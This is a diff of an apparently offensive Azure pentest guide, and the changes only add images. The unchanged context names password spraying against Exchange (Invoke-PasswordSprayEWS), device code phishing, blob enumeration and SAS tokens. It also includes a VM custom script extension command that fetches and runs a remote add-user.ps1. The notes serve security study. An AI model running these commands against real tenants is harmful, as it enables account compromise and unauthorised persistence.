@@ -11,7 +11,9 @@
 
 **Resource** → Actual service which could be a virtual machine, storage account, key vault, App services, Azure Functions, API services, etc.
 
-
+<div align="center">
+<img width="60%" alt="Azure" src="https://github.com/user-attachments/assets/6be54a06-2813-45f4-a101-332ae87c0714" />
+</div>
 
 **Azure Entra ID(Active Directory)** → Entra ID manages the authentication and authorization of identity objects like **users, groups and applications**, allowing them to access resources like Microsoft Graph API. For example, when **an application needs to send emails or access files in OneDrive, these API permissions** would be assigned in Entra ID. Entra ID facilitates **SSO, MFA and identity federation**. It handles user authentication and access across Microsoft 365 apps, third-party apps, and on-premises systems. Ex Roles - Global Administrator, Teams Administrator, Helpdesk Administrator, etc.
 
@@ -198,7 +200,13 @@ Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -
 
 </aside>
 
+<div align="center">
+<img width="100%" alt="ICG" src="https://github.com/user-attachments/assets/418b83db-0d2c-40bc-be1a-2825941f0118" />
 
+<img width="564" height="663" alt="ICG2" src="https://github.com/user-attachments/assets/df319129-a51a-4429-8263-347fd12d2992" />
+
+<img width="1462" height="547" alt="ICG3" src="https://github.com/user-attachments/assets/9f02a308-3740-40ea-8a2b-efb66cab3f32" />
+</div>
 
 
 ```powershell
@@ -233,7 +241,7 @@ az login --use-device-code
 
 ```
 
-
+<img width="628" height="262" alt="DC" src="https://github.com/user-attachments/assets/691d7a12-5f75-4747-adc4-644c6bd056bc" />
 
 <aside>
 📢 Device code phishing -
@@ -327,6 +335,9 @@ Invoke-EnumerateAzureBlobs -Base "testcorp"
 
 > Shared Access Signature (SAS) is used to provide delegated access to azure storage without sharing the primary storage account credentials. It's a URI that grants limited, time-bound access to Azure storage resources.
 > 
+
+<img width="1392" height="94" alt="SAS" src="https://github.com/user-attachments/assets/3b392f7f-d023-4b13-8ad7-b3dfd0498220" />
+
 
 <aside>
 📢 SAS Tokens can be found in 
@@ -449,7 +460,9 @@ Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName
 Set-AzVMCustomScriptExtension -ResourceGroupName "<myResourceGroup>" -VMName "<myVM>" -Name "<myCustomScript>" -FileUri "https://raw.githubusercontent.com/<test>/<test>/master/windows-support-script-simple/add-user.ps1" -Run "add-user.ps1" -Location "<myVMregion>"
 ```
 
-
+<div align="center">
+<img width="612" height="254" alt="VM Extension" src="https://github.com/user-attachments/assets/54c1d030-95e0-49a1-91d9-0877cafc13e5" />
+</div>
 
 ---
 
